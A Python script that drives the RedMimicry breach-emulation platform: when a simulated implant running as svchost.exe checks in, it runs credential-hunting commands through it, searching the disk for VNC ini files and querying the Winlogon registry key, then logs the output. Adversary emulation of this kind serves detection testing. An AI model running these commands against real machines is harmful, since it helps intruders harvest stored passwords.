
#!/usr/bin/env python3

import argparse
import logging
import signal
import sys

import redmimicry


def operator_simulation(api: redmimicry.Api, implant):
    # check that we are running in the last stage of the breach emulation by checking process image
    if not implant["image"] == "svchost.exe":
        return
    implant_id = implant["id"]

    # reduce sleep time
    api.shell(implant_id, "sleep 5 1")

    # perform some well known enumeration commands
    commands = [
        "dir c:\\*vnc.ini /s /b",
        "dir c:\\*ultravnc.ini /s /b",
        "dir c:\\ /s /b | findstr /si *vnc.ini",
        "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\""
        ]
    results = [ api.shell(implant_id, "shell %s" % cmd) for cmd in commands ]

    # restore sleep time
    api.shell(implant_id, "sleep 60 10")

    return results


def main():
    parser = argparse.ArgumentParser(description="An actor emulation script for RedMimicry")
    parser.add_argument("-H", "--hostname", type=str, help="hostname of the RedMimicry server", required=True)
    parser.add_argument("-t", "--auth-token", type=str, help="RedMimicry server auth-token", required=True)
    parser.add_argument("-v", "--verbose", help="verbose output", action="store_true")
    parser.add_argument("-s", "--tls", help="enable TLS", action="store_true")
    args = parser.parse_args()
    logging_level = logging.INFO
    if args.verbose:
        logging_level = logging.DEBUG
    logging.basicConfig(level=logging_level, format='%(asctime)s - %(levelname)s : %(message)s')
    hostname = args.hostname
    auth_token = args.auth_token
    logging.info("connecting to %s" % hostname)
    api = redmimicry.Api(hostname, auth_token, args.tls)
    bot = redmimicry.SimpleBot(api)

    bot.on_connect(operator_simulation)
    bot.on_connect(lambda api, implant : logging.info("new connection from %s (%s)" % (implant["name"], implant["public_ip"])))
    bot.start()

    def sigint_handler(sig, frame):
        bot.stop()
        bot.join()
        sys.exit(0)
    signal.signal(signal.SIGINT, sigint_handler)

    for results in bot:
        if results == None:
            continue
        for result in results:
            for e in result:
                logging.debug(e["text"])


if __name__ == "__main__":
    main()
